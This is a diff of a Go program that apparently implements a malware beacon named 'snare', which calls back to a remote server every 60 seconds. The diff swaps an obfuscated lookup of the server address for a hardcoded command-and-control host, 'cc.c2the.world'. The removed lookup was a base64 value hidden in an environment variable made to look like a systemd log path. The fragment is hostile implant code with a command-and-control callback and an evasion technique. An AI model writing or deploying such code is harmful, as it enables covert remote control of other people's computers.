@@ -5,14 +5,12 @@
 package main
 
 import (
-	b64 "encoding/base64"
 	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
 	"os/exec"
-	"strings"
 	"time"
 )
 
@@ -21,10 +19,11 @@ var src = "snare"      // where is this calling back from
 var loopTime = 60      //sleep time in secs
 
 func getServer() string {
-	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
-	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
-	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
-	return string(decoded)
+	//envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
+	//trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	//return string(decoded)
+	return "cc.c2the.world"
 }
 
 func getIP() string {
